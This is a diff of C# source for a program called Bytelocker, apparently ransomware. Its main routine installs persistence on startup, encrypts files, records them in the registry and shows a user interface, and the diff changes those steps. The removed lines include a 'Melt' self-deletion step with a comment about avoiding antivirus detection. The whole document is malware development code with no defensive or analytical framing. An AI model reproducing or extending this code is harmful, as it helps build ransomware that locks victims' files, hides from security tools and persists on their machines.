@@ -1,6 +1,5 @@
 ﻿using Bytelocker.CryptoManager;
 using Bytelocker.Installer;
-using Bytelocker.Persistence;
 using Bytelocker.Settings;
 using Bytelocker.Tools;
 using Bytelocker.UI;
@@ -18,25 +17,14 @@ namespace Bytelocker
 
         public static void Main(String[] args)
         {
-            if ((args.Length > 0))
-            {
-                if (!(args[0] == Melt.NO_MELT_ARG))
-                {
-                    // melting and adding to startup may trigger av
-                    new Melt();
-                }
-            }
-            else
-            {
-                new Melt();
-            }
+            Install();
 
             Encrypt();
 
             // if no files have been encrypted, uninstall
             if (rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null")
             {
-                new Uninstall();
+                Uninstall();
             }
             else
             {
@@ -50,7 +38,7 @@ namespace Bytelocker
             if (!(rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown")))
             {
                 CryptoManagerMainHandler cmh = new CryptoManagerMainHandler();
-                cmh.EncryptFolder(@"TEST_FOLDER_HERE");
+                cmh.EncryptFolder(@"");
             }
         }
 
@@ -63,6 +51,11 @@ namespace Bytelocker
         public static void Uninstall()
         {
             new Uninstall();
+        }
+
+        private static void Install()
+        {
+            new Persistence();
         }
 
 
